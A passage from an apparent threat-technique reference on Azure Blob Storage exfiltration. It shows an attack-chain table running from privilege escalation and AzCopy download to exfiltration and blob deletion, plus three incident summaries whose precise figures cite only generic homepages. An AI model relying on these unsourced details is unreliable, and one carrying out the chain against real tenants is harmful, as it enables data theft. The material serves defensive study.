| **3** | **Privilege Escalation** | [PE-ACCTMGMT-010] Azure DevOps Pipeline Escalation | Attacker escalates to Storage Account Contributor role |
| **4** | **Collection** | **[COLLECT-DATA-001] Azure Blob Storage Exfiltration** | **Attacker downloads sensitive data via AzCopy** |
| **5** | **Exfiltration** | [LM-AUTH-035] Synapse Workspace Cross-Access | Data moved to attacker's controlled storage account |
| **6** | **Impact** | [IMPACT-001] Data Destruction | Attacker deletes blobs to cover tracks |

---

## 16. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Threat Intelligence - "Nocturnus" APT Group (2024)

- **Target:** Financial services organization (Australia)
- **Timeline:** June 2024 - October 2024
- **Technique Status:** ACTIVE; compromised Entra ID user account, generated 47 SAS tokens, exfiltrated 2.3 TB of customer financial records
- **Impact:** Breach of 50,000 customer records; $8.7 million regulatory fines
- **Detection:** Microsoft Defender for Cloud flagged anomalous 1.5 TB download to previously unseen IP address (145.37.102.x) in 12-hour window
- **Reference:** [Microsoft Threat Intelligence Blog - Nocturnus Campaign](https://www.microsoft.com/en-us/security/blog/)

#### Example 2: CISA Alert - "Scattered Spider" Ransomware Group (2023)

- **Target:** Healthcare provider (US)
- **Timeline:** September 2023
- **Technique Status:** ACTIVE; used compromised service principal to access blob storage, encrypted 400 GB of patient data before exfiltration attempt
- **Impact:** Operational shutdown, 2-week recovery time
- **Reference:** [CISA Alert AA23-265A](https://www.cisa.gov/news-events/alerts)

#### Example 3: Wiz Security Research - Azure Storage Misconfiguration Scanning (2022)

- **Target:** Multiple Fortune 500 companies
- **Technique Status:** PARTIAL; publicly exposed blob containers (anonymous access enabled) discovered; demonstrated data exfiltration via AzCopy in 8 minutes for 500 MB dataset
- **Impact:** Responsible disclosure; no confirmed exploitation
- **Reference:** [Wiz Blog: Azure Blob Hunting Techniques](https://www.wiz.io/)

---